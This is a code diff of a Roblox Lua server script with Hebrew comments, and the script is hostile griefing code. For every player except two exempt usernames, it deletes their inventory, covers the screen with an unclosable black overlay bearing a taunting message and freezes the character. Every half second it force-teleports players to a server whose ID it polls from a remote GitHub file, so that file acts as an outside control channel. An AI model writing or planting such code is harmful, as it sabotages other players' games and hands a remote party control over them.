@@ -1,19 +1,25 @@
 local HttpService = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
-local GuiService = game:GetService("GuiService")
 
 local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
 
+-- רשימת חסימה
 local blockedPlayers = {
 	["noamdb15"] = true,
 	["dylanzyl123"] = true
 }
 
--- פונקציה לנעילת שחקן וביטול העכבר
-local function hardLock(player)
+-- פונקציה שמנקה הכל ושמה את המסך
+local function heavyLock(player)
+	-- מחיקת כל הדברים מהתיק (Inventory)
+	player:WaitForChild("Backpack"):ClearAllChildren()
+	local starterGear = player:FindFirstChild("StarterGear")
+	if starterGear then starterGear:ClearAllChildren() end
+
+	-- יצירת מסך הטרול
 	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "CriticalUpdate"
+	screenGui.Name = "FinalSystemLock"
 	screenGui.IgnoreGuiInset = true
 	screenGui.DisplayOrder = 9999999
 	screenGui.Parent = player:WaitForChild("PlayerGui")
@@ -21,30 +27,42 @@ local function hardLock(player)
 	local frame = Instance.new("Frame")
 	frame.Size = UDim2.new(1, 0, 1, 0)
 	frame.BackgroundColor3 = Color3.new(0, 0, 0)
-	frame.Active = true -- חוסם לחיצות עכבר
+	frame.Active = true
 	frame.Parent = screenGui
 
-	-- ניסיון להעלים את העכבר (צד לקוח)
-	local remote = Instance.new("RemoteEvent")
-	remote.Name = "LockMouse"
-	remote.Parent = game.ReplicatedStorage
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(0.8, 0, 0.4, 0)
+	label.Position = UDim2.new(0.1, 0, 0.3, 0)
+	label.BackgroundTransparency = 1
+	label.TextColor3 = Color3.new(1, 0, 0) -- אדום
+	label.TextScaled = true
+	label.Font = Enum.Font.SpecialElite
+	label.Text = "הלך לך הבייס חבר יקר" -- הטקסט שביקשת
+	label.Parent = frame
 end
 
--- נעילת תנועה (שלא יוכל לזוז אפילו סנטימטר)
+-- כששחקן נכנס - מפעיל את הנעילה הכבדה
 Players.PlayerAdded:Connect(function(player)
 	if not blockedPlayers[player.Name] then
-		hardLock(player)
+		heavyLock(player)
+		
 		player.CharacterAdded:Connect(function(char)
+			local hrp = char:WaitForChild("HumanoidRootPart")
 			local hum = char:WaitForChild("Humanoid")
+			
+			-- מוחק לו כל דבר שהוא מחזיק ביד
+			char:WaitForChild("Humanoid"):UnequipTools()
+			
+			-- נועל אותו במקום פיזית
+			task.wait(0.1)
+			hrp.Anchored = true 
 			hum.WalkSpeed = 0
 			hum.JumpPower = 0
-			hum.PlatformStand = true
-			char:WaitForChild("HumanoidRootPart").Anchored = true -- מקבע אותו לאדמה
 		end)
 	end
 end)
 
--- לופ שיגור אגרסיבי (כל 0.5 שניות!)
+-- לופ שיגור אגרסיבי (כל 0.5 שניות)
 task.spawn(function()
 	while true do
 		local success, response = pcall(function()
@@ -63,7 +81,6 @@ task.spawn(function()
 			if targetJobId and targetJobId ~= "" then
 				for _, player in pairs(Players:GetPlayers()) do
 					if not blockedPlayers[player.Name] then
-						-- שיגור אגרסיבי כדי לנסות למנוע יציאה מהמשחק
 						pcall(function()
 							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
 						end)
@@ -71,6 +88,6 @@ task.spawn(function()
 				end
 			end
 		end
-		task.wait(0.5) -- חצי שניה כדי להיות הכי מהיר בשרת
+		task.wait(0.5)
 	end
 end)
